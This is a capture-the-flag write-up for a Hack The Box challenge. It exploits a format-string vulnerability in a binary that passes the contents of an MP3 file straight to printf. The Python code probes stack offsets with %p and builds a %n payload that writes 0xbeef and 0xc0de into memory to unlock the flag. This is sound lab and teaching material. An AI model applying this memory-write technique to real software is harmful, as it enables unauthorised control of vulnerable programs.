Credit to @X41 for the help on this challenge

HTB Challenge

In this one, we get a web server, and inside the challenge directory, we get a binary.

looking in the binary, we can see that the code looks for a file called `test.mp3` in `/tmp/`, and will check the first three bytes for magic bytes of an MP3. Afterwards, it will check in its own memory for `0xbeef` and `0xc0de`. And then, if it passes these two checks, it will read out the flag.

The key to this exploit is to spot the vulnerable `printf` function

```c
  printf("[*] Analyzing mp3 data: ");
  printf(local_28);
```

This `printf` function is taking in raw data that doesnt have a format control string taking from the data! Meaning, we control the format control string to do whatever we want.

Thanks to [this blog](https://axcheron.github.io/exploit-101-format-strings/) we can easily figure out how to write arbitrary information.

first, locate the pointers you wish to write over with`%x$p` and pwndbg
```python
for i in range (40):
    mp3 = open("/tmp/test.mp3","wb")
    mp3.write(b"\x49\x44\x33")
    mp3.write(f"%{i}$p".encode())
    mp3.close()
    p = e.process()
    output = p.recvline_contains(b"Analyzing mp3 data: ", False)
    print(f"{i}:",sep="",end="")
    print(output)
    p.close()
```

We can see that with values of 12 and 13, we can get the pointers for the `0xdead1337` and `0x1337beef` values, which we can overwrite with `%x$n`, replacing x with positions.

so, according to the blog

> According to the _printf()_ man page, here is what **%n** should do :
> 
> _The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted._
>
> *Hum, It’s a bit cryptic… Basically, it means that **%n** will write the **size** of our input at the address pointed by **%n**. For example, the following input : **AAAA%n**, means that we will write the value 4 (because the size of “AAAA” equals 4) at the address pointed by **%n**.*
 ...
 > *But, here is a trick : `AAAA%<value-4>x%7$n` (it’s value-4 because we already wrote 4 bytes, AAAA). For example, `AAAA%96x%7$n` will write the value **100** at the address **0x41414141**. Why ? Because `%100x` will print your agument padded with 100 bytes (FYI, it pads with “space”).*
 
 We dont need the AAAA padding, so what we need is to write the values to the right addresses. Luckily, python converts hex to ints automatically! So we can simply write
 ```python
 #pointer in 12th offset
beef = 0xbeef
#pointer in 13th offset
code = 0xc0de
```

and use format strings in python to make the correct format control string in the program.
```python
mp3 = open("/tmp/test.mp3","wb")
mp3.write(b"\x49\x44\x33")
#n reads in the amount of bytes, and will write it to the pointer specified before $
mp3.write(f"%{beef}x%12$n%{code-beef}x%13$n".encode()) 
mp3.close()
```

a bit more code to test the malicious file...
```python
flag = open("flag.txt","w")
flag.write("heythere")
flag.close()
p = e.process()
```
And we get
```zsh
[>] Now playing: Darude Sandstorm!

heythere
```

Now to take the file in `/tmp/test.mp3` and boot up the remote instance, and get the flag!

It worked!

https://www.hackthebox.com/achievement/challenge/158887/594